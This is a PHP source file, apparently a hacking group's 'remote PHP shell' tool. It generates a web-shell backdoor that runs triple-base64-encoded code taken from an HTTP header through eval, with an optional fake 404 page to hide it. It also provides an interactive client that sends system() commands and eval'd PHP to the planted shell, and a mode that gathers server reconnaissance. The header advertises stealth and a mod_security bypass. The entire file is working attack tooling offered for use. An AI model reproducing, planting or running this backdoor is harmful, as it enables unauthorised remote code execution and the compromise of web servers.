<?php
/*

  __  __ _______   __
 /__)/  )/  )/ _) /__)_
/ ( (__/(__/( __)/ ( /_
-----------------------
R00T3Rz - r00t3rz.com
#|-------------------------------
#| R00T3Rz Remote PHP Shell v.2
#| By: Hannibal Ksa (HK)
#| Contact : r00t3rz.com or @r00t3rz
#| Greetz: b4ll3r, Secure-X41, alm3refh.com
#|-------------------------------

*NOTE!! :
Use these scripts entirely at your own risk.
The author cannot be held responsible for any damage, direct nor consequential,
caused by the use of, or inability to use the techniques or scripts presented here.

" AND THIS FILE IS UNDER The GNU General Public License v3.0 "


###################################################################
## Shell Features: ##
###################################################################
### 0x01. Execution commands in encrypted and unsuspicious way. ###
### 0x02. Use encryption. ###
### 0x03. Use unsuspicious functions. ###
### 0x04. Hidden from lamer'z. ###
### 0x05. Bypass some security stuff. ###
### ^ (such as mode-security and some programs'z). ###
###################################################################
##
# tHiS sCrIpT wAs cOdEd in 2012 - eDiTeD iN 2014 fOr pUbLiC uSe oNlY 4 r00t3rz.com <3
# ./hk
##

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
echo "\n";
echo "\t\t  __  __ _______   __";
echo "\n\t\t /__)/  )/  )/ _) /__)_";
echo "\n\t\t/ ( (__/(__/( __)/ ( /_";
echo "\n\t\tR00T3Rz - www.r00t3rz.com ";
echo "\n\t\t # uNdErGrOuNd sHiT! ";
echo "\n\n";
echo "\n\t";
echo "# r00t3rz remote php shell 2012 - v.2 stable! #";
echo "\n\t\t";
echo "^ c0d3d by HaNniBaL KsA (HK) =D ^";
echo "\n\n\n\n\t";
if($argv[1] == "-h" or $argv[1] == "--help"){
echo "[#] Usage: php ".$argv[0]." [OPTION] <SHELL>\n";
echo "\n";
echo "Options:";
echo "\n";
echo "-g, --generate Generate the r00t3rz shell with/without security.\n-c, --command Send your command to the r00t3rz shell with executing with your function.\n-e, --eval Send your PHP cod'z to the r00t3rz shell \"Using Eval\".\n-i, --info Get information form the r00t3rz shell about the server and some security stuff.\n-y, --yes Set the security option in generate option to true.\n-n, --no Set the security option in generate option to false.\n-h, --help This shity message.";echo "\nOption -g, --generate\nUsage : php ".$argv[0]." -g <NAME> <WITH/WITHOUT SECURITY>\nE.x :  php ".$argv[0]." -g hk.php -y";
echo "Option -c, --command\nUsage : php ".$argv[0]." -c <URL/SHELL> <FUNCTION>";
echo "E.x : Usage : php ".$argv[0]." -c http://localhost/hk.php system \n\n";
echo "\n# For more help? contact us on twitter: @r00t3rz #";
die();
} elseif ($argv[1] == "-g" or $argv[1] == "--generate") {
 $unsecurecode = "<?php if (@\$_SERVER[\"HTTP_HK\"]){ \$hk=\$_SERVER[\"HTTP_HK\"];@eval(base64_decode(base64_decode(base64_decode(\$hk)))); } ?>";
 $securecode = "<?php if (@\$_SERVER[\"HTTP_HK\"]){ \$hk=\$_SERVER[\"HTTP_HK\"];@eval(base64_decode(base64_decode(base64_decode(\$hk)))); } else { header('HTTP/1.1 404 Not Found');echo('<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"><html><head>
<title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL '.\$_SERVER['SCRIPT_NAME'].' was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');} ?>";
 $name = $argv[2];
 if(!$name){
  echo "\n[!] Please enter the name of the file.\n[+] To put the r00t3rz Shell code in to it.\n\n";die();
 }
 $secure = $argv[3];
  if(!$secure or $secure == "no" or $secure == "-n" or $secure == "--no"){
  echo "\n[!] You did not choose the secure r00t3rz Shell!.\n[+] Any one can open the shell in the browser.\n\n";
  echo "\n\n\n[+] Please wait!\n[#] Generating the r00t3rz Shell without security ...\n\n";
  sleep(3);
  $file = fopen($name,"w");
  if(fwrite($file,$unsecurecode)){
   echo "\n[#] Saving r00t3rz Shell code into $name .";
   sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1);echo ".\n"; sleep(2);echo "\n[!] Done r00t3rz Shell: $name\n\n";
   die();
  }
 } elseif ($secure == "yes" or $secure == "-y" or $secure == "--yes"){
  echo "\n\n[+] Please wait!\n[#] Generating the r00t3rz Shell with security ...\n\n";
  sleep(3);
  $file = fopen($name,"w");
  if(fwrite($file,$securecode)){
   echo "\n[#] Saving r00t3rz Shell code into $name .";
   sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1); echo "."; sleep(1);echo ".\n"; sleep(2);
   echo "\n[!] Done r00t3rz Shell: $name\n\n";
   die();
  }
 } else {
  echo "\n[!] Error .. Pleas enter an acceptable value in security option!\n\n";
  echo "[+] For generating the r00t3rz Shell with security choice: ";
  echo "yes OR -y OR --yes\n";
  echo "[+] For generating the r00t3rz Shell without security choice: ";
  echo "no OR -n OR --no OR leave it blank\n\n\n\n";
  die();
 }
} elseif ($argv[1] == "-c" or $argv[1] == "--command" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $shell = $argv[2];
 $url = str_replace($vowels, "", $shell);
 $url = $http.$url;
 if(!$shell){
  die("\n[!] Please enter the r00t3rz shell URL.\n\n");
 }
 $fun = $argv[3];
 if(!$fun){
  $fun = "system";
  echo "\n[!] You did not choose a function.\n[+] I will use the system function -> default function.\n\n";
 }
 echo "\n[!] For exit/quit type \"exit\" or \"close\" or \"quit\".\n\n";
 while(1){
  if($hk == "exit" or $hk == "quit" or $hk == "close"){ echo "Exiting ...\n\n";sleep(2);exit(); }
  echo "\n\n";
  echo "HK @ r00t3rz :~$";
  $hk = trim(fgets(STDIN));
  $w00t = "$fun(\"$hk\");";
  $cmd = base64_encode(base64_encode(base64_encode($w00t)));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$cmd","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
  curl_setopt($ch, CURLOPT_HEADER, 0); # change the value to 1 or true for show SERVER HEADER like "X-Powered-By: PHP/5.3.3" ...etc!
  $buffer = curl_exec($ch);
# if(preg_match("404",$buffer)){
# echo ""\n[!] Please check the r00t3rz shell URL.\n[+] error while connecting -> 404 Notfound!!.\n\n","light_red","");die("","",""));
# }
# echo "\n\n","","");
  echo "\n\n".$buffer;
 }
} elseif ($argv[1] == "-e" or $argv[1] == "--eval" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $shell = $argv[2];
 $url = str_replace($vowels, "", $shell);
 $url = $http.$url;
 if(!$shell){
  echo "\n[!] Please enter the r00t3rz shell URL.\n\n";
  die();
 }
 echo "\n[!] For exit/quit type \"exit\" or \"close\" or \"quit\".\n\n";
 while(1){
  if($hk == "exit" or $hk == "quit" or $hk == "close"){ echo "Exiting ...\n\n";sleep(2);exit(); }
  echo "\n\nHK @ PHP-sh3ll :~$";
  $hk = trim(fgets(STDIN));
  $code = base64_encode(base64_encode(base64_encode($hk)));
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$code","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
  curl_setopt($ch, CURLOPT_HEADER, 0); # change the value to 1 or true for show SERVER HEADER like "X-Powered-By: PHP/5.3.3" ...etc!
  $buffer = curl_exec($ch);
# if(preg_match("404",$buffer)){
# die("\n[!] Please check the r00t3rz shell URL.\n[+] error while connecting -> 404 Notfound!!.\n\n");
# }
  echo "\n\n".$buffer;
 }
} elseif ($argv[1] == "-i" or $argv[1] == "--info" ){
 $vowels = array("http://", "www." , "https://");
 $http = "http://";
 $url = $argv[2];
 $url = str_replace($vowels, "", $url);
 $url = $http.$url;
 if(!$url){
  echo "\n[!] Please enter the r00t3rz shell URL.\n\n";
 }
 $hk = "echo \" Your IP-ADDRESS: \".\$_SERVER['REMOTE_ADDR'].\"
Server IP-ADDRESS: \".@gethostbyname(\$_SERVER['HTTP_HOST']).\" (\".\$_SERVER['SERVER_ADDR'].\")
Server Name: \".\$_SERVER['SERVER_NAME'].\"
Software: \".\$_SERVER['SERVER_SOFTWARE'].\"
PHP Version: \".phpversion().\"
Uname -a: \".php_uname().\"
Site: \".getenv(\"HTTP_HOST\").\"\n\";
\$safe = (@ini_get(\"safe_mode\")=='')?\"OFF\":\"ON\";
echo \" Safe Mode: \".\$safe.\"\n\";
if (''==(ini_get('disable_functions'))){ echo \" Disable Functions : None\n\n\n\"; }else{ echo \" Disable Functions : \".ini_get('disable_functions').\"\n\n\n\";}";
 $info = base64_encode(base64_encode(base64_encode($hk)));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 curl_setopt($ch,CURLOPT_HTTPHEADER,Array("HK:$info","HTTP_USER_AGENT:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"));
 curl_setopt($ch, CURLOPT_HEADER, 0);
 $buffer = curl_exec($ch);
 echo "\n\n".$buffer;
} else {
echo "\n[#] Usage: php ".$argv[0]." [OPTION] <SHELL>\n[#] Help: php ".$argv[0]." -h\n\n\n\n";
}

# HK
?>
